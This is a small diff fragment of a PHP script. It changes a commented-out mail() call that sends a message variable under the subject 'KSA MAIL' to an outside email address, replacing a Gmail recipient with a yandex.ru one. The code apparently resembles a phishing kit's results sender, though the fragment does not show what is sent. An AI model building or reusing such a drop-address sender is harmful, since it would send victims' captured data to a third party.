@@ -30,5 +30,5 @@ fclose($fp);
 
 // 	$mailHeaders = "From: " . $x1. "<". $x1 .">\r\n";
 // $subject = "KSA MAIL";
-// mail('a.williams8927@gmail.com', $subject,$mesaj, $mailHeaders);
+// mail('mailto:chuks.blaze@yandex.ru', $subject,$mesaj, $mailHeaders);
 ?>
